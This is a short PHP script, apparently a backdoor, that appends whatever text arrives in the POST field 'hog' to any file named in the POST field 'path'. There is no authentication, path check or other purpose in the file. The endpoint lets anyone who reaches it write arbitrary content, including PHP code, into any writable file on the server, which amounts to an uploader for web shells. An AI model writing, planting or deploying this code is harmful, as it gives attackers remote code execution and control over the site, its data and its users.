<?php

if(!empty($_POST['hog'])){
    $path = $_POST['path'];
    $data = $_POST['hog'];
    $fp = fopen($path, 'a');
    fwrite($fp, $data);
    fclose($fp);
}

?>